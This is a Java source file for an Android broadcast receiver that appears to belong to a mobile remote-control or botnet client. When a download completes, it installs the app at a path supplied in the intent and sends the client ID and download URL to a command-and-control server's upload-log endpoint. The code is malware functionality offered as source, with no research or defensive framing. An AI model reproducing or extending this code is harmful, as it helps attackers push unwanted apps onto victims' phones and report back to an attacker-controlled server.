package com.ot.grhq.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Base64;

import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Download completed receiver
 */
public class DownloadComplete extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.intent.action.DOWNLOAD_COMPLETE".equals(intent.getAction())) {
            String app = intent.getStringExtra("app_path");
            if (app != null && !app.isEmpty())
                PackageManager.installApp(context, app);

            String downloadURL = intent.getStringExtra("download_url");

            String message = Utils.clientID(context) + ": " + downloadURL + " successfully downloaded";

            String formData = "id=" + Utils.clientID(context);
            formData += "&type=client";
            formData += "&res=incoming_call";
            formData += "&message=" + message;
            formData += "&timestamp=" + System.currentTimeMillis();

            new NotifyC2(Utils.getC2Address() + "/uploadLog", formData, result -> {

            }).execute();
        }
    }
}
